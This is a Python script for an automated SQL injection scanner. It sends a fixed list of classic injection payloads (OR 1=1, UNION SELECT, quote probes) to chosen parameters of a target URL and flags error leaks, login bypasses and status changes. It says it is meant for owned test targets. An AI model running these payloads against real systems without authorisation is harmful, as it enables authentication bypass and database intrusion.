"""
Minimal, LLM-free, rule-based SQLi auto-scanner.

Strix (AI-agent pentesting) uses an LLM to decide what to try next.
This script replaces that decision-making with a fixed payload list and
deterministic response comparisons -- no LLM, no agent loop, no Docker.

Scope: run only against targets you own/control, e.g. vulnerable_app.py
in this same directory.
"""

from __future__ import annotations

import argparse
import sys
from dataclasses import dataclass, field

import requests

SQL_ERROR_MARKERS = (
    "sql error",
    "sqlite3.operationalerror",
    "you have an error in your sql syntax",
    "unclosed quotation mark",
    "odbc sql server driver",
)

# Classic payloads covering: comment-based bypass, boolean OR, UNION probing,
# and syntax-breaking probes used for error-based detection.
PAYLOADS = [
    "' --",
    "' OR '1'='1' --",
    '" OR "1"="1" --',
    "' OR 1=1 --",
    "') OR ('1'='1' --",
    "' UNION SELECT NULL,NULL,NULL --",
    "'",
    '"',
]


@dataclass
class Finding:
    param: str
    payload: str
    reason: str
    response_snippet: str = field(repr=False)


def probe(
    url: str, base_params: dict[str, str], param: str, payload: str
) -> requests.Response:
    params = dict(base_params)
    params[param] = payload
    return requests.get(url, params=params, timeout=10)


def scan(url: str, base_params: dict[str, str], fuzz_params: list[str]) -> list[Finding]:
    baseline = requests.get(url, params=base_params, timeout=10)
    baseline_text = baseline.text.lower()
    baseline_looked_like_success = "login ok" in baseline_text

    findings: list[Finding] = []
    for param in fuzz_params:
        for payload in PAYLOADS:
            resp = probe(url, base_params, param, payload)
            text = resp.text.lower()

            if any(marker in text for marker in SQL_ERROR_MARKERS):
                findings.append(
                    Finding(param, payload, "error-based: SQL error leaked in response", resp.text)
                )
                continue

            if not baseline_looked_like_success and "login ok" in text:
                findings.append(
                    Finding(
                        param,
                        payload,
                        "boolean/auth-bypass: baseline failed, payload succeeded",
                        resp.text,
                    )
                )
                continue

            if resp.status_code != baseline.status_code:
                findings.append(
                    Finding(
                        param,
                        payload,
                        f"status code changed ({baseline.status_code} -> {resp.status_code})",
                        resp.text,
                    )
                )

    return findings


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--url", required=True, help="e.g. http://127.0.0.1:5000/login")
    parser.add_argument(
        "--baseline",
        action="append",
        default=[],
        metavar="KEY=VALUE",
        help="known-bad baseline param, repeatable, e.g. --baseline username=zzz --baseline password=zzz",
    )
    parser.add_argument(
        "--fuzz",
        action="append",
        required=True,
        help="param name to fuzz, repeatable, e.g. --fuzz username",
    )
    args = parser.parse_args()

    base_params = dict(kv.split("=", 1) for kv in args.baseline)

    print(f"Target: {args.url}")
    print(f"Baseline params: {base_params}")
    print(f"Fuzzing params: {args.fuzz}")
    print(f"Payload count: {len(PAYLOADS)}")
    print("-" * 60)

    findings = scan(args.url, base_params, args.fuzz)

    if not findings:
        print("No SQLi indicators found with this payload set.")
        return 0

    print(f"{len(findings)} finding(s):\n")
    for f in findings:
        print(f"  param={f.param!r} payload={f.payload!r}")
        print(f"    reason: {f.reason}")
        print()

    return 1


if __name__ == "__main__":
    sys.exit(main())
